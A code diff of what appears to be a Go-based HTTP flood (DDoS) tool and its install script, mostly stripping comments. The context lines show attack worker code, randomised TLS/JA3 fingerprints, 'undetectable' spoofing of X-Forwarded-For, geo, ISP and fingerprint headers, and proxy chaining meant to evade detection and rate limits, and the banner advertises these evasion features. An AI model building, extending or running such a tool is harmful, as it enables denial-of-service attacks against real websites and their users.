@@ -33,7 +33,6 @@ import (
 	"bufio"
 	"crypto/rand"
 	"crypto/tls"
-	"encoding/binary"
 	"fmt"
 	"io"
 	"math/big"
@@ -325,7 +324,6 @@ func getRandomJA3Signature() JA3Signature {
 
 func getRandomizedTLSConfig() *tls.Config {
 	sig := getRandomJA3Signature()
-	// Randomize TLS session ticket and record sizing
 	return &tls.Config{
 		NextProtos:                  sig.NextProtos,
 		InsecureSkipVerify:          true,
@@ -509,9 +507,9 @@ func randomIP() string {
 
 func randomPrivateIP() string {
 	privateRanges := [][]int{
-		{10, 0, 0, 0, 10, 255, 255, 255},     // 10.0.0.0/8
-		{172, 16, 0, 0, 172, 31, 255, 255},    // 172.16.0.0/12
-		{192, 168, 0, 0, 192, 168, 255, 255},  // 192.168.0.0/16
+		{10, 0, 0, 0, 10, 255, 255, 255},
+		{172, 16, 0, 0, 172, 31, 255, 255},
+		{192, 168, 0, 0, 192, 168, 255, 255},
 	}
 	rangeIdx := randInt(0, len(privateRanges)-1)
 	r := privateRanges[rangeIdx]
@@ -552,7 +550,6 @@ func randomBrowserPlugin() string {
 	return browserPlugins[randInt(0, len(browserPlugins)-1)]
 }
 
-// Generate realistic proxy chain with varying lengths
 func generateProxyChain() string {
 	numProxies := randInt(1, 5)
 	chain := make([]string, numProxies)
@@ -566,7 +563,6 @@ func generateProxyChain() string {
 	return strings.Join(chain, ", ")
 }
 
-// Generate random port numbers (realistic)
 func randomPort() int {
 	commonPorts := []int{80, 443, 8080, 8443, 3128, 1080, 8888, 8000}
 	if randInt(1, 100) <= 70 {
@@ -575,7 +571,6 @@ func randomPort() int {
 	return randInt(1024, 65535)
 }
 
-// Generate realistic forwarder string
 func generateForwarderString() string {
 	forwarders := []string{
 		"http://proxy%d.example.com:%d",
@@ -591,11 +586,9 @@ func generateForwarderString() string {
 func addUndetectableHeaders(req *http.Request) {
 	spoofedIP := randomIP()
 	
-	// Always add these core headers
 	req.Header.Set("X-Forwarded-For", spoofedIP)
 	req.Header.Set("X-Real-IP", spoofedIP)
 	
-	// Add 5-12 random spoofing headers for more randomness
 	numHeaders := randInt(5, 13)
 	selectedHeaders := make(map[string]bool)
 	
@@ -606,7 +599,6 @@ func addUndetectableHeaders(req *http.Request) {
 		}
 		selectedHeaders[headerName] = true
 		
-		// Sophisticated header value generation
 		switch headerName {
 		case "Forwarded":
 			forwardedParts := []string{
@@ -630,7 +622,6 @@ func addUndetectableHeaders(req *http.Request) {
 			}
 			
 		default:
-			// Randomly choose between IPv4, private IP, or IPv6
 			ipType := randInt(1, 100)
 			if ipType <= 70 {
 				req.Header.Set(headerName, spoofedIP)
@@ -642,14 +633,12 @@ func addUndetectableHeaders(req *http.Request) {
 		}
 	}
 	
-	// Add ISP and network info (30% chance)
 	if randInt(1, 100) <= 30 {
 		req.Header.Set("X-ISP", randomISP())
 		req.Header.Set("X-Network-Name", fmt.Sprintf("%s Network", randomISP()))
 		req.Header.Set("X-ASN", randomASN())
 	}
 	
-	// Add geo-location spoofing (35% chance)
 	if randInt(1, 100) <= 35 {
 		country := randomCountryCode()
 		req.Header.Set("X-Geo-Country", country)
@@ -659,7 +648,6 @@ func addUndetectableHeaders(req *http.Request) {
 		req.Header.Set("X-Geo-City", fmt.Sprintf("City-%d", randInt(1, 1000)))
 	}
 	
-	// Add X-Forwarded-For with multiple hops (40% chance)
 	if randInt(1, 100) <= 40 {
 		numHops := randInt(2, 6)
 		hops := make([]string, numHops)
@@ -676,20 +664,17 @@ func addUndetectableHeaders(req *http.Request) {
 		req.Header.Set("X-Forwarded-For", multiHop)
 	}
 	
-	// Add browser fingerprinting evasion headers
 	if randInt(1, 100) <= 25 {
 		req.Header.Set("X-Browser-Fingerprint", fmt.Sprintf("%x", randInt(1000000, 9999999)))
 		req.Header.Set("X-Plugin-List", randomBrowserPlugin())
 	}
 	
-	// Add timing attack evasion (random delays in headers)
 	if randInt(1, 100) <= 15 {
 		req.Header.Set("X-Request-Timestamp", time.Now().Add(time.Duration(randInt(-300, 300))*time.Millisecond).Format(time.RFC3339Nano))
 	}
 }
 
 func generateRandomUA() string {
-	// Use real User-Agent strings 60% of the time
 	if randInt(1, 100) <= 60 {
 		return realUserAgents[randInt(0, len(realUserAgents)-1)]
 	}
@@ -1076,7 +1061,6 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
 			req.Header.Set("Connection", "keep-alive")
 
-			// ADVANCED UNDETECTABLE IP SPOOFING
 			addUndetectableHeaders(req)
 
 			numSecurity := randInt(1, 2)
@@ -1247,7 +1231,6 @@ if [ $? -eq 0 ]; then
     echo
     echo -e " ${CYAN}►${NC} Advanced IP Spoofing: ${YELLOW}30+ headers, evasion techniques${NC}"
     echo -e " ${CYAN}►${NC} Proxy mode loads from ${YELLOW}16 different sources${NC}"
-    echo -e " ${CYAN}►${NC} Undetectable features: ISP spoofing, geo-location, browser fingerprinting${NC}"
     echo
     exit 0
 else
